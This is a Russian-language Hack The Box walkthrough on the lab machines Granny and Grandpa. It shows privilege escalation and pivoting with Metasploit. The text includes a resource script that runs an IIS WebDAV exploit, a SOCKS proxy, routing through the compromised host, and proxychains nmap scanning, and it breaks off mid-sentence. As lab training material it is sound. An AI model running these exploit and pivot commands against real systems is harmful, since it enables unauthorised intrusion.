
### –≠—Å–∫–∞–ª–∞—Ü–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π

–ó–¥–µ—Å—å –≤—Å–µ –∏–¥–µ–Ω—Ç–∏—á–Ω–æ –ø—Ä–µ–¥—ã–¥—É—â–µ–π —Ç–∞—á–∫–∏: –¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π —è –±—É–¥—É –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ç–æ—Ç –∂–µ —Å–ø–ª–æ–∏—Ç.

![msf-grandpa-exploit-suggester.png]({{ "/img/htb/boxes/grandparents/msf-grandpa-exploit-suggester.png" | relative_url }})
{: .center-image}

–î–ª—è –ø–æ—Ä—è–¥–∫–∞ —è –∑–∞–ø—É—Å—Ç–∏–ª –ø–æ–∏—Å–∫ –ª–æ–∫–∞–ª—å–Ω—ã—Ö —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π, –∏ —Å–ø–∏—Å–æ–∫ –æ–∫–∞–∑–∞–ª—Å—è —Ç–æ—á–Ω–æ —Ç–∞–∫–∏–º –∂–µ –∫–∞–∫ –∏ —É –≤–∏—Ä—Ç—É–∞–ª–∫–∏ Granny.

![msf-grandpa-privesc.png]({{ "/img/htb/boxes/grandparents/msf-grandpa-privesc.png" | relative_url }})
{: .center-image}

–í—ã–±—Ä–∞–ª–∏ `ms14_070_tcpip_ioctl`, –ø–æ–≤—ã—Å–∏–ª–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ –∏ –ø–æ–ª—É—á–∏–ª–∏ —Å–≤–æ—é —Å–µ—Å—Å–∏—é.

![msf-grandpa-get-hashes.png]({{ "/img/htb/boxes/grandparents/msf-grandpa-get-hashes.png" | relative_url }})
{: .center-image}

–ó–∞–±–∏—Ä–∞–µ–º –Ω–∞–≥—Ä–∞–¥—É, –∏ Grandpa –ø—Ä–æ–π–¥–µ–Ω!

![grandpa-trophy.png]({{ "/img/htb/boxes/grandparents/grandpa-trophy.png" | relative_url }})
{: .center-image}

# Pivoting

–ù—É –∞ —Ç–µ–ø–µ—Ä—å, —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ, —Ç–æ, —Ä–∞–¥–∏ —á–µ–≥–æ –º—ã —Å–µ–≥–æ–¥–Ω—è —Å–æ–±—Ä–∞–ª–∏—Å—å! –Ø –ø—Ä–æ–¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É—é –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –±–∞–∑–æ–≤—ã–µ –ø—Ä–∏–Ω—Ü–∏–ø—ã –ø—Ä–æ–±—Ä–æ—Å–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π —Å –ø–æ–º–æ—â—å—é Metasploit.

–û–±–æ–∑–Ω–∞—á–∏–º —É—Å–ª–æ–≤–∏—è –∑–∞–¥–∞—á–∏. –î–∞–Ω–æ:

1. –õ–æ–∫–∞–ª—å–Ω–∞—è –í–ú –∞—Ç–∞–∫—É—é—â–µ–≥–æ —Å Kali Linux (IP: `10.10.14.30`), –∫–æ—Ç–æ—Ä–∞—è –∏–º–µ–µ—Ç –ø—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ –í–ú Granny (IP: `10.10.10.15`).
2. –í–ú Granny, –∫–æ—Ç–æ—Ä–∞—è –∏–º–µ–µ—Ç –ø—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ –í–ú Grandpa (IP: `10.10.10.14`).
3. –£ –í–ú –∞—Ç–∞–∫—É—é—â–µ–≥–æ –Ω–µ—Ç –ø—Ä—è–º–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∫ –í–ú Grandpa ‚Äî –≤—Ö–æ–¥—è—â–∏–µ –∏ –∏—Å—Ö–æ–¥—è—â–∏–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è –±–ª–æ–∫–∏—Ä—É—é—Ç—Å—è —Å –ø–æ–º–æ—â—å—é `iptables`.

–¢—Ä–µ–±—É–µ—Ç—Å—è:

1. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –º–µ–∂–¥—É –í–ú –∞—Ç–∞–∫—É—é—â–µ–≥–æ –∏ –í–ú Grandpa –¥–ª—è —Å—Ç–æ—Ä–æ–Ω–Ω–∏—Ö —É—Ç–∏–ª–∏—Ç (**–≤–Ω–µ –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞** —Å–µ—Å—Å–∏–∏ Metasploit).
2. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –º–µ–∂–¥—É –í–ú –∞—Ç–∞–∫—É—é—â–µ–≥–æ –∏ –í–ú Grandpa **–≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ** —Å–µ—Å—Å–∏–∏ Metasploit –∏ –ø–æ–ª—É—á–∏—Ç—å –º–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–µ –ø—Ä–∞–≤–∞ –Ω–∞ —Ö–æ—Å—Ç–µ Grandpa.

–†–µ—à–µ–Ω–∏–µ...

## –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞

–Ø –±—É–¥—É –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π —Ñ–∞–π—Ä–≤–æ–ª –¥–ª—è Linux `iptables`, —á—Ç–æ–±—ã –∏—Å–∫–ª—é—á–∏—Ç—å –ø—Ä—è–º–æ–µ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ —Å–≤–æ–µ–≥–æ —Ö–æ—Å—Ç–∞ –∏ —Ö–æ—Å—Ç–∞ Grandpa. –¢–∞–∫ —è –±—É–¥—É —É–≤–µ—Ä–µ–Ω, —á—Ç–æ –ø—Ä–∞–≤–∏–ª–∞ –∏–≥—Ä—ã –∏ –ø—Ä–∞–≤–¥–∞ –≤—ã–ø–æ–ª–Ω—è—é—Ç—Å—è.

```
root@kali:~# iptables -A OUTPUT -d 10.10.10.14 -j DROP
root@kali:~# iptables -A INPUT -s 10.10.10.14 -j DROP
```

![iptables-drop-grandpa-out.gif]({{ "/img/htb/boxes/grandparents/iptables-drop-grandpa-out.gif" | relative_url }})
{: .center-image}

–£–ø—Ä–æ—â–µ–Ω–Ω–æ —Å—Ö–µ–º—É –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ —Å–∫—Ä—ã—Ç–æ–º—É –∑–∞ VPN —Å–µ–≥–º–µ–Ω—Ç—É (–≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–π) —Å–µ—Ç–∏ –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–∏–∏ Hack The Box –º–æ–∂–Ω–æ –∏–∑–æ–±—Ä–∞–∑–∏—Ç—å —Ç–∞–∫.

![network-htb.png]({{ "/img/htb/boxes/grandparents/network-htb.png" | relative_url }})
{: .center-image}

–û–¥–Ω–∞–∫–æ –≤ —Ä–∞–º–∫–∞—Ö –Ω–∞—à–µ–π –∑–∞–¥–∞—á–∏ –ª—É—á—à–µ –∞–±—Å—Ç—Ä–∞–≥–∏—Ä–æ–≤–∞—Ç—å—Å—è –∏ –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç—å —Å—Ö–µ–º—É –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è ¬´–ê—Ç–∞–∫—É—é—â–∏–π-Pivot-Grandpa¬ª –≤ —Å–ª–µ–¥—É—é—â–µ–º –≤–∏–¥–µ.

![network-pivot-basic.png]({{ "/img/htb/boxes/grandparents/network-pivot-basic.png" | relative_url }})
{: .center-image}

–°–ª–µ–≤–∞ ‚Äî –∞—Ç–∞–∫—É—é—â–∏–π (–í–ú Kali), –ø–æ—Å–µ—Ä–µ–¥–∏–Ω–µ ‚Äî –í–ú Granny, —Å–ø—Ä–∞–≤–∞ ‚Äî –∂–µ—Ä—Ç–≤–∞ (–í–ú Grandpa). ¬´–û–±—â–µ–Ω–∏–µ¬ª –Ω–∞–ø—Ä—è–º—É—é –º–µ–∂–¥—É –∞—Ç–∞–∫—É—é—â–∏–º –∏ –∂–µ—Ä—Ç–≤–æ–π –∏—Å–∫–ª—é—á–µ–Ω–æ. –ï–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω—ã–π —Å–ø–æ—Å–æ–± –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è ‚Äî –ø–æ—Å—Ä–µ–¥—Å—Ç–≤–æ–º –ø—Ä–æ–º–µ–∂—É—Ç–æ—á–Ω–æ–≥–æ —Ö–æ—Å—Ç–∞.

## –¢–æ—á–∫–∞ –æ–ø–æ—Ä—ã

–•–æ—Å—Ç –ø–æ—Å–µ—Ä–µ–¥–∏–Ω–µ ‚Äî –∞ –∏–º–µ–Ω–Ω–æ Granny ‚Äî –±—É–¥–µ–º –Ω–∞–∑—ã–≤–∞—Ç—å ¬´—Ç–æ—á–∫–æ–π –æ–ø–æ—Ä—ã¬ª –∏–ª–∏ ¬´–æ–ø–æ—Ä–Ω—ã–º –ø—É–Ω–∫—Ç–æ–º¬ª (–∞–Ω–≥–ª. [foothold](https://www.offensive-security.com/metasploit-unleashed/pivoting/)). –ß–µ—Ä–µ–∑ –Ω–µ–≥–æ –±—É–¥–µ—Ç –ø—Ä–æ—Ö–æ–¥–∏—Ç—å –ø–µ—Ä–µ–¥–∞—á–∞ —Ç—Ä–∞—Ñ–∏–∫–∞ –¥–æ Grandpa –∏ –æ–±—Ä–∞—Ç–Ω–æ. –ü–µ—Ä–≤—ã–º –¥–µ–ª–æ–º –ø–æ–ª—É—á–∏–º –¥–æ—Å—Ç—É–ø –∫ —Ç–æ—á–∫–µ –æ–ø–æ—Ä—ã, –∫–∞–∫ –º—ã —ç—Ç–æ –¥–µ–ª–∞–ª–∏ —Ä–∞–Ω–µ–µ.

–Ø –Ω–∞–ø–∏—Å–∞–ª —Å–∫—Ä–∏–ø—Ç –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞ –¥–ª—è Metasploit, —á—Ç–æ–±—ã –≤ —Å–ª—É—á–∞–µ, –µ—Å–ª–∏ —á—Ç–æ-—Ç–æ –ø–æ–π–¥–µ—Ç –Ω–µ —Ç–∞–∫, –∏ –Ω—É–∂–Ω–æ –±—É–¥–µ—Ç –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞—Ç—å –≤—Å—é —ç—Ç—É –∫–æ–Ω—Å—Ç—Ä—É–∫—Ü–∏—é, –º–Ω–µ –Ω–µ –ø—Ä–∏—à–ª–æ—Å—å –±—ã –∑–∞–Ω–æ–≤–æ –≤—Ä—É—á–Ω—É—é –≤–≤–æ–¥–∏—Ç—å –∫–æ–º–∞–Ω–¥—ã.

```
# pivot.rc

use auxiliary/server/socks4a
set SRVPORT 9050
run -j

use exploit/windows/iis/iis_webdav_upload_asp
set LHOST tun0
set RHOST 10.10.10.15
set InitialAutoRunScript migrate -f
exploit -j

back
```

–í –ø–µ—Ä–≤–æ–º –±–ª–æ–∫–µ —è –ø–æ–¥–Ω–∏–º–∞—é –ø—Ä–æ–∫—Å–∏-—Å–µ—Ä–≤–µ—Ä –Ω–∞ –ª–æ–∫–∞–ª—å–Ω–æ–º –ø–æ—Ä—Ç—É `9050`, –∞ –≤–æ –≤—Ç–æ—Ä–æ–º ‚Äî –∏—Å–ø–æ–ª—å–∑—É—é –º–æ–¥—É–ª—å `iis_webdav_upload_asp` –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –Ω–∏–∑–∫–æ–ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Å–µ—Å—Å–∏–∏ meterpreter –∏ —Å—Ä–∞–∑—É –∂–µ –º–∏–≥—Ä–∏—Ä—É—é –≤ –¥—Ä—É–≥–æ–π –ø—Ä–æ—Ü–µ—Å—Å, —á—Ç–æ–±—ã –Ω–µ —Å–ª–æ–≤–∏—Ç—å –æ—à–∏–±–∫—É –Ω–µ—Ö–≤–∞—Ç–∫–∏ —Ç–æ–∫–µ–Ω–æ–≤ (–ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞).

```
root@kali:~# msfconsole -qr pivot.rc
```

![msf-pivot-granny-iis-webdav-upload-asp.png]({{ "/img/htb/boxes/grandparents/msf-pivot-granny-iis-webdav-upload-asp.png" | relative_url }})
{: .center-image}

–ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥—ã `route add` —è –¥–æ–±–∞–≤–ª—è—é –ø—Ä–∞–≤–∏–ª–æ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü–∏–∏ –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–æ–π —Å–µ—Å—Å–∏–∏ meterpreter (—Å–µ—Å—Å–∏—è 1).

```
msf5 > route add 10.10.10.14/32 1
[*] Route added
```

–ó–¥–µ—Å—å —á–µ—Ä–µ–∑ —Å–ª–µ—à —è —É–∫–∞–∑—ã–≤–∞—é –º–∞—Å–∫—É –ø–æ–¥—Å–µ—Ç–∏ `255.255.255.255` (–≤ –Ω–æ—Ç–∞—Ü–∏–∏ –±–µ—Å–∫–ª–∞—Å—Å–æ–≤–æ–π –∞–¥—Ä–µ—Å–∞—Ü–∏–∏ ‚Äî [CIDR](https://ru.wikipedia.org/wiki/–ë–µ—Å–∫–ª–∞—Å—Å–æ–≤–∞—è_–∞–¥—Ä–µ—Å–∞—Ü—è)), —á—Ç–æ–±—ã –∞—Å—Å–æ—Ü–∏–∏—Ä–æ–≤–∞—Ç—å —Å —ç—Ç–∏–º –ø—Ä–∞–≤–∏–ª–æ–º —Ç–æ–ª—å–∫–æ –æ–¥–∏–Ω —Ö–æ—Å—Ç ‚Äî Grandpa (`10.10.10.14`).

–ü—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω—ã–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –∑–∞–≤–µ—Ä—à–µ–Ω—ã, –≤ —á–µ–º –º–æ–∂–Ω–æ —É–±–µ–¥–∏—Ç—å—Å—è —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥ `jobs` –∏ `route`.

```
msf5 > jobs
msf5 > route
```

![msf-jobs-route.png]({{ "/img/htb/boxes/grandparents/msf-jobs-route.png" | relative_url }})
{: .center-image}

–ü–µ—Ä–≤–∞—è –∫–æ–º–∞–Ω–¥–∞ –ø–æ–∫–∞–∂–µ—Ç –≤—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã, –∫–æ—Ç–æ—Ä—ã–µ –∑–∞–ø—É—â–µ–Ω—ã –Ω–∞ —Ñ–æ–Ω–µ Metasploit (–≤–∏–¥–∏–º –Ω–∞—à SOCKS-—Å–µ—Ä–≤–µ—Ä), –∞ –≤—Ç–æ—Ä–∞—è –≤—ã–≤–µ–¥–µ—Ç —Å–ø–∏—Å–æ–∫ –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø—Ä–∞–≤–∏–ª –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü–∏–∏.

## SOCKS-—Å–µ—Ä–≤–µ—Ä —Å –ø–æ–º–æ—â—å—é Metasploit

–ù–µ—Å–º–æ—Ç—Ä—è –Ω–∞ —Ç–æ, —á—Ç–æ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ—Ä—Ç–æ–≤ –º–æ–∂–Ω–æ –ø—Ä–æ–≤–µ—Å—Ç–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞–º–∏ Metasploit (—Å –Ω–∞—Å—Ç—Ä–æ–µ–Ω–Ω–æ–π —Ç–∞–º –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü–∏–µ–π), —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –º–Ω–æ–≥–æ –¥—Ä—É–≥–∏—Ö —Å–ª—É—á–∞–µ–≤, –∫–æ–≥–¥–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —Å—Ç–æ—Ä–æ–Ω–Ω–∏–º–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–º–∏ –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω—ã. –í —ç—Ç–æ–º –Ω–∞–º –∏ –ø–æ–¥—ã–≥—Ä–∞–µ—Ç –Ω–∞—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π –≤ –ø—Ä–µ–¥—ã–¥—É—â–µ–º –ø–∞—Ä–∞–≥—Ä–∞—Ñ–µ —Å–µ—Ä–≤–µ—Ä SOCKS, —á–µ—Ä–µ–∑ –∫–æ—Ç–æ—Ä—ã–π —Å –ø–æ–º–æ—â—å—é `proxychains` –º–æ–∂–Ω–æ —Ä–∞—Å—à–∞—Ä–∏–≤–∞—Ç—å —Ç—Ä–∞—Ñ–∏–∫ –¥–ª—è –≤–Ω–µ—à–Ω–∏—Ö —É—Ç–∏–ª–∏—Ç.

–ù–µ–¥–∞–≤–Ω–æ –≤ Metasploit –¥–æ–±–∞–≤–∏–ª–∞—Å—å –ø–æ–¥–¥–µ—Ä–∂–∫–∞ 5-–π –≤–µ—Ä—Å–∏–∏ –ø—Ä–æ—Ç–æ–∫–æ–ª–∞ SOCKS, –æ–¥–Ω–∞–∫–æ, –∫–∞–∫ –±—ã–≤–∞–µ—Ç —Å–æ –≤—Å–µ–º–∏ –Ω–æ–≤—ã–º–∏ —Ñ–∏—á–∞–º–∏, –≤ –Ω–µ–π –µ—â–µ –ø–æ–ª–Ω–æ [–±–∞–≥–æ–≤](https://github.com/rapid7/metasploit-framework/issues/11513). –ù–æ —ç—Ç–æ –Ω–µ –ø–æ–≤–æ–¥ —Ä–∞—Å—Å—Ç—Ä–∞–∏–≤–∞—Ç—å—Å—è, –≤–µ–¥—å –≤–µ—Ä—Å–∏—è 4a —É–º–µ–µ—Ç –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏ –≤—Å–µ —Ç–æ –∂–µ —Å–∞–º–æ–µ (–∑–∞ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ–º, —Ä–∞–∑–≤–µ —á—Ç–æ, –ø–æ–¥–¥–µ—Ä–∂–∫–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏), –≤ —Ç–æ–º —á–∏—Å–ª–µ –∏ —Ä–µ–∑–æ–ª–≤–∏—Ç—å DNS-–∏–º–µ–Ω–∞ –≤ IP. –í —Å–æ—á–µ—Ç–∞–Ω–∏–∏ —Å –º–æ–¥—É–ª–µ–º `route` —ç—Ç–æ –¥–∞–µ—Ç –ø—Ä–µ–∫—Ä–∞—Å–Ω—É—é [–≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/manage/autoroute.md#combined-with-default-route) –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —Ö–æ—Å—Ç –≤ –∫–∞—á–µ—Å—Ç–≤–µ –æ–±—ã—á–Ω–æ–≥–æ –ø—Ä–æ–∫—Å–∏ –¥–ª—è –±—Ä–∞—É–∑–µ—Ä–∞ –∏ —Ç–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º —Å–µ—Ä—Ñ–∏—Ç—å –ò–Ω—Ç–µ—Ä–Ω–µ—Ç –æ—Ç –∏–º–µ–Ω–∏ –∂–µ—Ä—Ç–≤—ã.

–Ø —É—Å—Ç–∞–Ω–æ–≤–ª—é [proxychains-ng](https://github.com/rofl0r/proxychains-ng) (—á–µ—Ç–≤–µ—Ä—Ç–∞—è –≤–µ—Ä—Å–∏—è), —Ç–∞–∫ –∫–∞–∫ –æ–Ω–∞ –≤—Å–µ–≥–¥–∞ –∫–∞–∑–∞–ª–∞—Å—å –º–Ω–µ –±–æ–ª–µ–µ —Å—Ç–∞–±–∏–ª—å–Ω–æ–π, –∏ –∑–∞–ø—É—â—É —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ Nmap —á–µ—Ä–µ–∑ SOCKS-–ø—Ä–æ–∫—Å–∏.

```
root@kali:~# apt install proxychains4
root@kali:~# proxychains4 nmap -n -v -Pn -sT 10.10.10.14 -p80
```

![nmap-grandpa-proxychains-web.png]({{ "/img/htb/boxes/grandparents/nmap-grandpa-proxychains-web.png" | relative_url }})
{: .center-image}

–ú–æ–∂–Ω–æ —É–±–µ–¥–∏—Ç—å—Å—è, —á—Ç–æ 80-–π –ø–æ—Ä—Ç –Ω–∞ —Ö–æ—Å—Ç–µ Grandpa –æ—Ç–∫—Ä—ã—Ç.

–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ Nmap –≤–µ—Å—å–º–∞ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω—ã –≤ —Å–ª—É—á–∞–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Å–∫–≤–æ–∑—å `proxychains` (–Ω–µ—Ç –ø–æ–¥–¥–µ—Ä–∂–∫–∏ —Ç–∏—Ö–æ–≥–æ SYN-—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è, –ø–æ—Ç–æ–º—É —á—Ç–æ `proxychains` –Ω–µ –ø–æ–Ω–∏–º–∞–µ—Ç –∫—Ä–∞—Ñ—Ç–æ–≤—ã–µ –ø–∞–∫–µ—Ç—ã, –Ω–µ—Ç –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –≤–µ—Ä—Å–∏–π —Å–µ—Ä–≤–∏—Å–æ–≤, –¥–∞ –∏ —Å–∫–æ—Ä–æ—Å—Ç—å –æ—Å—Ç–∞–≤–ª—è–µ—Ç –∂–µ–ª–∞—Ç—å –ª—É—á—à–µ–≥–æ), –æ–¥–Ω–∞–∫–æ —ç—Ç–æ –≤—Å–µ–≥–æ –ª–∏—à—å –ø—Ä–∏–º–µ—Ä, –∏ —Ç–æ—á–Ω–æ —Ç–∞–∫ –∂–µ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ –¥—Ä—É–≥–∏—Ö —É—Ç–∏–ª–∏—Ç.

–ù–∞—Å—Ç—Ä–æ–π–∫–∏ `proxychains-ng` –Ω–∞—Ö–æ–¥—è—Ç—Å—è –≤ —Ñ–∞–π–ª–µ `/etc/proxychains4.conf`. –¢–∞–º –º–æ–∂–Ω–æ –∏–∑–º–µ–Ω–∏—Ç—å –Ω–æ–º–µ—Ä –ø–æ—Ä—Ç–∞, –≥–¥–µ —Ä–∞—Å–ø–æ–ª–æ–∂–∏–ª–∞—Å—å –ø—Ä–æ–∫—Å—è (–º—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏ –¥–µ—Ñ–æ–ª—Ç–Ω—ã–π `9050`).

–ù–∞ —ç—Ç–æ–º —ç—Ç–∞–ø–µ –Ω–∞—à—É –≤–æ–æ–±—Ä–∞–∂–∞–µ–º—É—é —Å—Ö–µ–º—É –º–æ–∂–Ω–æ –¥–æ–ø–æ–ª–Ω–∏—Ç—å –ø–æ–º–µ—Ç–∫–∞–º–∏ –æ–± –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ SOCKS-—Å–µ—Ä–≤–µ—Ä–∞ –∏ –º–∞—Ä—à—Ä—É—Ç–æ–≤ Metasploit.

![network-pivot-route-and-socks.png]({{ "/img/htb/boxes/grandparents/network-pivot-route-and-socks.png" | relative_url }})
{: .center-image}

## –†–µ–≤–µ—Ä—Å–∏–≤–Ω—ã–π SSH-—Ç—É–Ω–Ω–µ–ª—å

–ß—Ç–æ–±—ã –∏–º–µ—Ç—å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å ¬´–æ–±—â–∞—Ç—å—Å—è¬ª —Å Grandpa –≤ —Ä–∞–º–∫–∞—Ö —Å–µ—Å—Å–∏–∏ Metasploit, –º—ã –¥–æ–ª–∂–Ω—ã –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü–∏—é —á–µ—Ä–µ–∑ foothold –æ–±—Ä–∞—Ç–Ω–æ –Ω–∞ –Ω–∞—à —Ö–æ—Å—Ç. –ò–∑-–∑–∞ —Ç–æ–≥–æ, —á—Ç–æ —è –∏—Å–∫—É—Å—Å—Ç–≤–µ–Ω–Ω–æ –¥—Ä–æ–ø–∞—é —Ç—Ä–∞—Ñ–∏–∫ –º–µ–∂–¥—É —Å–æ–±–æ–π –∏ Grandpa, –ø–æ—Å–ª–µ–¥–Ω–∏–π –Ω–µ –º–æ–∂–µ—Ç –¥–æ –º–µ–Ω—è –¥–æ—Å—Ç—É—á–∞—Ç—å—Å—è (—Ä–∞–≤–Ω–æ –∫–∞–∫ –∏ –æ—Ç–≤–µ—Ç–∏—Ç—å —è –µ–º—É –Ω–µ —Ç–æ–∂–µ –º–æ–≥—É), –∏ –Ω–∞–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø—Ä–æ–ª–æ–∂–∏—Ç—å —ç—Ç—É —á–∞—Å—Ç—å –º–æ—Å—Ç–∞ –∫–æ–º–º—É–Ω–∏–∫–∞—Ü–∏–π –≤—Ä—É—á–Ω—É—é. –°–¥–µ–ª–∞—Ç—å —ç—Ç–æ –º–æ–∂–Ω–æ —Å –ø–æ–º–æ—â—å—é SSH-—Ç—É–Ω–Ω–µ–ª—è –æ—Ç —Ç–æ—á–∫–∏ –æ–ø–æ—Ä—ã –¥–æ –º–∞—à–∏–Ω—ã –∞—Ç–∞–∫—É—é—â–µ–≥–æ.

¬´–ü–æ—á–µ–º—É –±—ã –≤ —Ç–∞–∫–æ–º —Å–ª—É—á–∞–µ –ø—Ä–æ—Å—Ç–æ –Ω–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å `bind_tcp` –≤–º–µ—Å—Ç–æ –¥–µ—Ñ–æ–ª—Ç–Ω–æ–≥–æ `reverse_tcp` –∏ –Ω–µ –∑–∞–º–æ—Ä–∞—á–∏–≤–∞—Ç—å—Å—è —Å –∫–∞–∫–∏–º-—Ç–æ —Ç–∞–º SSH?¬ª ‚Äî –º–æ–∂–µ—à—å –ø–æ–∏–Ω—Ç–µ—Ä–µ—Å–æ–≤–∞—Ç—å—Å—è —Ç—ã. –î–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ, —Ç–∞–∫ —Å–¥–µ–ª–∞—Ç—å –º–æ–∂–Ω–æ, –æ–¥–Ω–∞–∫–æ –æ–±—Ä–∞—Ç–Ω—ã–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –≤—Å–µ–≥–¥–∞ —è–≤–ª—è–µ—é—Ç—Å—è –±–æ–ª–µ–µ –ø—Ä–µ–¥–ø–æ—á—Ç–∏—Ç–µ–ª—å–Ω—ã–º –≤–∞—Ä–∏–∞–Ω—Ç–æ–º: –æ–Ω–∏ –Ω–∞–¥–µ–∂–Ω–µ–µ —Å —Ç–æ—á–∫–∏ –∑—Ä–µ–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ (–∫ bind-—à–µ–ª–ª—É –º–æ–∂–µ—Ç –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫—Ç–æ —É–≥–æ–¥–Ω–æ), –∞ —Ñ–∞–π—Ä–≤–æ–ª—ã —á–∞—â–µ —Ä—É–≥–∞—é—Ç—Å—è –∏–º–µ–Ω–Ω–æ –Ω–∞ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ **–≤—Ö–æ–¥—è—â–∏–µ** —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è...

–í –ø–æ—Å–ª–µ–¥–Ω–µ–π —Ä–µ–≤–∏–∑–∏–∏ Metasploit –º–æ–¥—É–ª—å `portfwd` (–∏–∑ —Å–æ—Å—Ç–∞–≤–∞ meterpreter) –æ–±–∑–∞–≤–µ–ª—Å—è –æ–ø—Ü–∏–µ–π `-R`, –∫–æ—Ç–æ—Ä–∞—è –≤ —Ç–µ–æ—Ä–∏–∏ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∫–æ–Ω—Ñ–∏–≥—É—Ä–∏—Ä–æ–≤–∞—Ç—å –æ–±—Ä–∞—Ç–Ω—ã–π –ø—Ä–æ–±—Ä–æ—Å –ø–æ—Ä—Ç–∞ —Å –∂–µ—Ä—Ç–≤—ã –Ω–∞ –º–∞—à–∏–Ω—É —Ö–∞–∫–µ—Ä–∞. –¢–∞–∫–∏–º —Å–ø–æ—Å–æ–±–æ–º —Ç–æ–∂–µ –º–æ–∂–Ω–æ –±—ã–ª–æ –±—ã –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å –ø—Ä–∏–µ–º –¥–∞–Ω–Ω—ã—Ö –æ—Ç Granny, –æ–¥–Ω–∞–∫–æ –≤ —Ä–∞–º–∫–∞—Ö —ç—Ç–æ–≥–æ –∫–µ–π—Å–∞ —É –º–µ–Ω—è –Ω–µ 